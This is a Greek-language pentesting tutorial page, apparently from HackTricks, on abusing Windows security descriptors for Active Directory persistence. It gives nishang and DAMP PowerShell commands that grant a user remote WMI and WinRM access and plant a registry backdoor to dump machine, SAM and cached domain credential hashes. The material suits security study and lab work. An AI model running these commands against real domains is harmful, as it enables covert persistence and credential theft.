# Περιγραφές ασφαλείας

{{#include ../../banners/hacktricks-training.md}}

## Περιγραφές ασφαλείας

[Από την τεκμηρίωση](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Η Security Descriptor Definition Language (SDDL) ορίζει τη μορφή που χρησιμοποιείται για την περιγραφή μιας περιγραφής ασφαλείας. Η SDDL χρησιμοποιεί συμβολοσειρές ACE για DACL και SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Οι **περιγραφές ασφαλείας** χρησιμοποιούνται για την **αποθήκευση** των **δικαιωμάτων** που έχει ένα **αντικείμενο** πάνω σε ένα **αντικείμενο**. Αν μπορείτε απλώς να **κάνετε** μια **μικρή αλλαγή** στην **περιγραφή ασφαλείας** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό το αντικείμενο, χωρίς να χρειάζεται να είστε μέλος μιας προνομιούχας ομάδας.

Επομένως, αυτή η τεχνική persistence βασίζεται στη δυνατότητα απόκτησης κάθε απαιτούμενου προνομίου πάνω σε συγκεκριμένα αντικείμενα, ώστε να μπορείτε να εκτελέσετε μια εργασία που συνήθως απαιτεί δικαιώματα διαχειριστή, χωρίς να χρειάζεται να είστε διαχειριστής.

### Πρόσβαση στο WMI

Μπορείτε να δώσετε σε έναν χρήστη πρόσβαση για **απομακρυσμένη εκτέλεση WMI** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Πρόσβαση στο WinRM

Παρέχετε πρόσβαση σε **κονσόλα winrm PS σε έναν χρήστη** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Απομακρυσμένη πρόσβαση σε hashes

Αποκτήστε πρόσβαση στο **registry** και κάντε **dump hashes**, δημιουργώντας ένα **Reg backdoor χρησιμοποιώντας** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ώστε να μπορείτε ανά πάσα στιγμή να ανακτήσετε το **hash του υπολογιστή**, το **SAM** και οποιοδήποτε **cached AD** διαπιστευτήριο στον υπολογιστή. Επομένως, είναι πολύ χρήσιμο να εκχωρήσετε αυτήν την άδεια σε έναν **regular user απέναντι σε έναν Domain Controller υπολογιστή**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Δείτε τα [**Silver Tickets**](silver-ticket.md) για να μάθετε πώς μπορείτε να χρησιμοποιήσετε το hash του λογαριασμού υπολογιστή ενός Domain Controller.

## Αναφορές

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
